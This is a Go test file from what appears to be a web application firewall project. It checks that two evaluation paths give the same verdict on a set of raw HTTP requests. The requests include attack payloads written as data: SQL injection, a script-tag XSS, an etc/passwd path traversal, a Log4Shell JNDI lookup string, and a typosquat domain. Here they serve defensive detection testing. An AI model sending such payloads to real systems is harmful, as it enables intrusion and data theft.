package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"net/http"
	"sort"
	"strings"
	"testing"

	"secure-proxy-waf/internal/engine"
	"secure-proxy-waf/internal/inspect"
)

// The wafeval harness measures the engine through inspect.Evaluate. Its
// numbers describe production only while Evaluate reaches the verdict
// handleReqmod reaches. This drives both over the same requests (each built
// twice, since a body is read once) and requires the same score and rules.
func TestEvaluateMatchesHandleReqmod(t *testing.T) {
	// The production heuristics, not the zero value (all off), or the
	// heuristic half of the verdict is never compared.
	withEngine(t, engine.Config{BlockThreshold: 10, Heuristics: engine.HeuristicsFromEnv()})

	// A high-entropy body: 4 KiB of hex digest text, enough for the
	// entropy heuristic to have something to score.
	var noise strings.Builder
	for i := 0; noise.Len() < 4096; i++ {
		s := sha256.Sum256([]byte{byte(i), byte(i >> 8)})
		noise.WriteString(hex.EncodeToString(s[:]))
	}

	raws := []string{
		"GET http://eq.example.com/index.html HTTP/1.1\r\nHost: eq.example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
		"GET http://eq.example.com/login?u=%27+OR+1%3D1-- HTTP/1.1\r\nHost: eq.example.com\r\n\r\n",
		"GET http://eq.example.com/s?q=<script>alert(1)</script> HTTP/1.1\r\nHost: eq.example.com\r\n\r\n",
		"GET http://eq.example.com/a/..%c0%af..%c0%afetc/passwd HTTP/1.1\r\nHost: eq.example.com\r\n\r\n",
		"GET http://eq.example.com/ HTTP/1.1\r\nHost: eq.example.com\r\nUser-Agent: ${jndi:ldap://x.example/a}\r\n\r\n",
		post("/api", "application/json", `{"q":"1 UNION SELECT password FROM u"}`),
		post("/up", "text/plain", noise.String()),
		// Protocol ghosting (H6): a PE header and an SSH banner in a text body.
		post("/u1", "text/plain", "MZ this program cannot be run in DOS mode."),
		post("/u2", "text/plain", "SSH-2.0-OpenSSH_9.6\r\n"),
		"CONNECT paypa1.com:443 HTTP/1.1\r\nHost: paypa1.com:443\r\n\r\n",
		"CONNECT xkqzjvwpfhtbmlrc.com:443 HTTP/1.1\r\nHost: xkqzjvwpfhtbmlrc.com:443\r\n\r\n",
		"CONNECT example.org:443 HTTP/1.1\r\nHost: example.org:443\r\n\r\n",
		"GET http://192.168.1.10/admin HTTP/1.1\r\nHost: 192.168.1.10\r\n\r\n",
	}
	ghostSeen := 0
	for i, raw := range raws {
		build := func() *http.Request {
			r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(raw)))
			if err != nil {
				t.Fatalf("case %d: %v", i, err)
			}
			return r
		}
		// Different client addresses for the two paths, so the second run
		// does not see the first in its heuristic window.
		handler := runReqmod(t, build(), "198.51.100."+itoa(100+i))
		in, lan := inspect.Evaluate(eng, crsEng, nil, build(), "203.0.113."+itoa(100+i))

		if lan {
			if handler.FeatureFound || handler.ICAPCode != 204 {
				t.Errorf("case %d: Evaluate skipped a LAN host, handleReqmod gave %s", i, handler)
			}
			continue
		}
		ids, _ := in.Verdict()
		sort.Strings(ids)
		got := strings.Join(ids, ",")
		action := "allow"
		if in.Blocked() {
			action = "block"
		}
		if strings.Contains(got, "H6-GHOST") {
			ghostSeen++
		}
		if got != handler.Rules || in.Score != handler.Score || action != handler.Action {
			t.Errorf("case %d (%s):\n  Evaluate      score=%d action=%s rules=[%s]\n  handleReqmod  %s",
				i, strings.SplitN(raw, "\r\n", 2)[0], in.Score, action, got, handler)
		}
	}
	// Without this the comparison could pass with the heuristics silently off
	// on both sides, which is how the first version of this test passed.
	if ghostSeen != 2 {
		t.Errorf("H6-GHOST fired on %d cases, want 2: the heuristic half of the verdict was not exercised", ghostSeen)
	}
}

// post is a raw POST to eq.example.com with a correct Content-Length.
func post(path, contentType, body string) string {
	return "POST http://eq.example.com" + path + " HTTP/1.1\r\nHost: eq.example.com\r\nContent-Type: " + contentType +
		"\r\nContent-Length: " + itoa(len(body)) + "\r\n\r\n" + body
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for ; n > 0; n /= 10 {
		b = append([]byte{byte('0' + n%10)}, b...)
	}
	return string(b)
}
